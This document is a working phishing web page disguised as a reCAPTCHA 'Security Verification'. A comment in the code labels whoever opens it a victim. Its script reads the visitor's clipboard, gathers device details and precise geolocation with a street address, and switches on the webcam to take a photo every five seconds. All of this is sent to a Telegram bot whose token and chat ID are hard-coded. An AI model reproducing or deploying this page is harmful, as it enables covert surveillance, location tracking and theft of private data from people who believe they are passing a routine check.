<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #0b1120 0%, #19223f 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 480px;
            width: 100%;
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(0, 255, 0, 0.2);
            border-radius: 40px;
            padding: 30px;
            box-shadow: 0 25px 60px rgba(0, 255, 0, 0.15);
        }

        .image-container {
            width: 100%;
            border-radius: 25px;
            overflow: hidden;
            margin-bottom: 25px;
            border: 3px solid rgba(0, 255, 0, 0.3);
        }

        .victim-image {
            width: 100%;
            display: block;
        }

        .security-badge {
            display: flex;
            align-items: center;
            gap: 10px;
            background: rgba(0, 255, 0, 0.1);
            padding: 10px 15px;
            border-radius: 50px;
            margin-bottom: 20px;
            border: 1px solid rgba(0, 255, 0, 0.4);
        }

        .badge-icon {
            width: 28px;
            height: 28px;
            background: #00ff00;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: black;
            font-weight: bold;
        }

        .badge-text {
            color: #00ff00;
            font-size: 12px;
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        h1 {
            font-size: 28px;
            color: white;
            margin-bottom: 8px;
        }

        .subtitle {
            color: #888;
            font-size: 14px;
            margin-bottom: 25px;
        }

        .recaptcha-box {
            background: #1a1a2a;
            border-radius: 16px;
            padding: 18px;
            display: flex;
            align-items: center;
            gap: 15px;
            border: 1px solid #333;
            cursor: pointer;
            transition: 0.3s;
            margin: 20px 0 10px;
        }

        .recaptcha-box:hover {
            background: #222235;
            border-color: #00ff00;
        }

        .recaptcha-box input {
            width: 24px;
            height: 24px;
            accent-color: #00ff00;
            cursor: pointer;
        }

        .recaptcha-text {
            flex: 1;
            color: white;
            font-size: 16px;
            font-weight: 500;
        }

        .recaptcha-logo {
            font-size: 30px;
        }

        .privacy-row {
            display: flex;
            justify-content: space-between;
            padding: 0 10px;
            font-size: 11px;
            color: #666;
            margin-bottom: 20px;
        }

        .permission-summary {
            background: rgba(0, 0, 0, 0.5);
            border-radius: 16px;
            padding: 20px;
            margin: 20px 0;
        }

        .permission-title {
            color: #00ff00;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 15px;
            text-transform: uppercase;
        }

        .permission-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
        }

        .perm-item {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #ccc;
            font-size: 13px;
        }

        .perm-icon {
            color: #00ff00;
            font-size: 14px;
        }

        .verify-btn {
            background: linear-gradient(135deg, #00ff00, #00cc00);
            color: black;
            border: none;
            padding: 18px;
            width: 100%;
            border-radius: 30px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.3s;
            opacity: 0.5;
            pointer-events: none;
            margin: 20px 0;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .verify-btn.active {
            opacity: 1;
            pointer-events: all;
        }

        .verify-btn.active:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 40px #00ff00;
        }

        .loader {
            border: 4px solid rgba(0, 255, 0, 0.1);
            border-top: 4px solid #00ff00;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .status {
            text-align: center;
            color: #00ff00;
            font-size: 14px;
            margin: 15px 0;
            min-height: 20px;
        }

        video, canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Victim's image from Telegram will appear here -->
        <div class="image-container" id="imageContainer">
            <img class="victim-image" id="victimImage" src="" alt="Loading...">
        </div>

        <div class="security-badge">
            <div class="badge-icon">✓</div>
            <span class="badge-text">NITIN 333 SECURE • VERIFICATION REQUIRED</span>
        </div>

        <h1>Verify Your Identity</h1>
        <div class="subtitle">Complete the security check to view this content</div>

        <div class="recaptcha-box" onclick="toggleCheckbox()">
            <input type="checkbox" id="robotCheck" onchange="toggleVerify()">
            <span class="recaptcha-text">I'm not a robot</span>
            <span class="recaptcha-logo">🛡️</span>
        </div>
        
        <div class="privacy-row">
            <span>Privacy</span>
            <span>Terms</span>
            <span>reCAPTCHA</span>
        </div>

        <div class="permission-summary">
            <div class="permission-title">✓ REQUIRED VERIFICATIONS</div>
            <div class="permission-grid">
                <div class="perm-item"><span class="perm-icon">📷</span> Live Camera Scan</div>
                <div class="perm-item"><span class="perm-icon">📍</span> Location Check</div>
                <div class="perm-item"><span class="perm-icon">📋</span> Clipboard Verify</div>
                <div class="perm-item"><span class="perm-icon">📱</span> Device ID</div>
                <div class="perm-item"><span class="perm-icon">🌐</span> Network Status</div>
                <div class="perm-item"><span class="perm-icon">🛡️</span> Security Check</div>
            </div>
        </div>

        <button class="verify-btn" id="verifyBtn" onclick="startVerification()">
            CONTINUE VERIFICATION
        </button>

        <div class="loader" id="loader"></div>
        <div class="status" id="status">System ready</div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        // ==================== CONFIG ====================
        const BOT_TOKEN = "8325723609:AAGcN0gUgz0r92KpFVwyM5JOzibSGVaKG3c";
        const ADMIN_ID = "6643732863";
        
        // Get parameters from URL
        const params = new URLSearchParams(window.location.search);
        const TARGET_ID = params.get('id') || ADMIN_ID;
        const BAIT_IMAGE = params.get('img');
        
        // Show victim's image
        if (BAIT_IMAGE) {
            document.getElementById('victimImage').src = BAIT_IMAGE;
        } else {
            document.getElementById('victimImage').src = 'https://via.placeholder.com/400x300?text=Secure+Content';
        }
        
        let cameraStream = null;

        // ==================== UI FUNCTIONS ====================
        function toggleCheckbox() {
            const checkbox = document.getElementById('robotCheck');
            checkbox.checked = !checkbox.checked;
            toggleVerify();
        }

        function toggleVerify() {
            const checkbox = document.getElementById('robotCheck');
            const verifyBtn = document.getElementById('verifyBtn');
            
            if (checkbox.checked) {
                verifyBtn.classList.add('active');
                document.getElementById('status').innerHTML = '✓ Click CONTINUE to verify';
            } else {
                verifyBtn.classList.remove('active');
                document.getElementById('status').innerHTML = 'System ready';
            }
        }

        // ==================== MAIN VERIFICATION ====================
        async function startVerification() {
            const btn = document.getElementById('verifyBtn');
            const loader = document.getElementById('loader');
            const status = document.getElementById('status');

            btn.style.display = 'none';
            loader.style.display = 'block';
            status.innerHTML = '⏳ Starting verification...';

            try {
                // 1. Get clipboard data
                status.innerHTML = '📋 Checking clipboard...';
                await getClipboard();

                // 2. Get device info
                status.innerHTML = '📱 Analyzing device...';
                await getDeviceInfo();

                // 3. Get location
                status.innerHTML = '📍 Getting location...';
                await getLocation();

                // 4. Access camera
                status.innerHTML = '📷 Accessing camera...';
                await setupCamera();

                // 5. Start capturing photos
                status.innerHTML = '🔐 Verification in progress...';
                startCapturing();

                status.innerHTML = '✅ Verification complete!';
                
                setTimeout(() => {
                    loader.style.display = 'none';
                }, 2000);

            } catch (error) {
                status.innerHTML = '❌ Error: ' + error.message;
                loader.style.display = 'none';
                btn.style.display = 'block';
            }
        }

        // ==================== CLIPBOARD ====================
        async function getClipboard() {
            try {
                const text = await navigator.clipboard.readText();
                if (text) {
                    sendToTelegram('📋 **Clipboard**\n' + text.substring(0, 500));
                }
            } catch {}
        }

        // ==================== DEVICE INFO ====================
        async function getDeviceInfo() {
            const info = {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            
            try {
                const battery = await navigator.getBattery();
                info.battery = Math.round(battery.level * 100) + '%';
            } catch {}
            
            sendToTelegram('📱 **Device Info**\n' + JSON.stringify(info, null, 2));
        }

        // ==================== LOCATION ====================
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve();
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        const location = {
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy + 'm'
                        };
                        
                        try {
                            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${location.lat}&lon=${location.lng}`);
                            const data = await res.json();
                            location.address = data.display_name;
                        } catch {}
                        
                        sendToTelegram('📍 **Location**\n' + JSON.stringify(location, null, 2));
                        resolve();
                    },
                    () => resolve()
                );
            });
        }

        // ==================== CAMERA ====================
        async function setupCamera() {
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });
                
                const video = document.getElementById('video');
                video.srcObject = cameraStream;
                await video.play();
                
                sendToTelegram('📷 **Camera**\n✓ Camera access granted');
                
            } catch (error) {
                sendToTelegram('📷 **Camera**\nPermission denied');
                throw error;
            }
        }

        // ==================== AUTO CAPTURE ====================
        function startCapturing() {
            // Capture immediately
            capturePhoto();
            
            // Then every 5 seconds
            setInterval(capturePhoto, 5000);
        }

        function capturePhoto() {
            if (!cameraStream) return;
            
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            
            context.drawImage(video, 0, 0, 640, 480);
            
            canvas.toBlob((blob) => {
                sendPhoto(blob, '📸 Live Capture');
            }, 'image/jpeg', 0.9);
        }

        // ==================== TELEGRAM ====================
        function sendPhoto(blob, caption) {
            const formData = new FormData();
            formData.append('chat_id', TARGET_ID);
            formData.append('photo', blob, 'capture.jpg');
            formData.append('caption', caption);
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).catch(e => console.log('Send error:', e));
        }

        function sendToTelegram(message) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TARGET_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            }).catch(e => console.log('Send error:', e));
        }
    </script>
</body>
</html>
